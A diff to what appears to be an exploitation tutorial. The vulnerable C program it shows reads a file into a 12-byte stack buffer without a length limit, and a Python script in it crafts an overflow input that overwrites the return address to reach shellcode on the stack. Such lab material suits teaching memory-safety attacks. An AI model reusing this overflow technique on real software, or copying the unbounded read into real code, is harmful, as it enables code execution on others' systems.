@@ -93,26 +93,26 @@ int main(void)
   FILE *_File;		
   uint _MaxCount;
   uint counter;
-  byte buffer [12];	// This may cause buffer overflow
+  byte buffer [12]; // This may cause buffer overflow
   
-  _File = _fopen("buf","rb");		// Read the content of buf file
-  if (_File != NULL) {				// If the file is found
-    _fseek(_File,0,SEEK_END);		// Point to the end of file
-    _MaxCount = _ftell(_File);		// Calculate the total bytes in the file
-    _fseek(_File,0,SEEK_SET);		// Point to the beginning of the file
+  _File = _fopen("buf","rb");       // Read the content of buf file
+  if (_File != NULL) {              // If the file is found
+    _fseek(_File,0,SEEK_END);       // Point to the end of file
+    _MaxCount = _ftell(_File);      // Calculate the total bytes in the file
+    _fseek(_File,0,SEEK_SET);       // Point to the beginning of the file
     printf("\n");
     printf("Current PID: %d\n",GetCurrentProcessId()); // Print current process id
     printf("\n");
     _fgets(buffer,_MaxCount,_File);	
-										// Put the content of file in the buffer
-										// It did not limit the number of bytes 
-										// put in the buffer, means it will cause
-										// buffer overflow 
+                                        // Put the content of file in the buffer
+                                        // It did not limit the number of bytes 
+                                        // put in the buffer, means it will cause
+                                        // buffer overflow 
     counter = 0;							
     if (_MaxCount != 0) {					
       do {
         buffer[counter] = buffer[counter] ^ 0xcc; 
-        								// Each byte in buffer will be XORed with 0xCC
+                                        // Each byte in buffer will be XORed with 0xCC
         counter++;												
       } while (counter < _MaxCount);
     }
@@ -200,17 +200,18 @@ Now lets try to execute shellcode on stack!
 
 Create a python script to generate the `buf` file:
 ```py
-address = "0019FF30"				# We place the shellcode at 0x0019FF30
+address = "0019FF30"                # We place the shellcode at 0x0019FF30
 address = address.decode("hex")
 eip = ''
 for a in address:
-	eip = chr(ord(a) ^ 0xcc) + eip	# XOR with 0xCC and append inversely
-									# Because of little-endian in binary
+	eip = chr(ord(a) ^ 0xcc) + eip  # XOR with 0xCC and append inversely
+                                    # Because of little-endian in binary
 
-open("buf",'w').write("a"*16 + eip + "b") 	# The "b" will become 0xCC
-											# 0xCC in machine code is mean breakpoint 
-											# so it will stop executing when it 
-											# execute this address (0x0019FF30) 
+open("buf",'w').write("a"*16 + eip + "b")   # The "b" will become 0xCC
+											# According to https://en.wikipedia.org/wiki/INT_(x86_instruction)
+                                            # 0xCC in machine code is mean breakpoint 
+                                            # so it will stop executing when it 
+                                            # execute this address (0x0019FF30) 
 ```
 
 Run it using debugger:
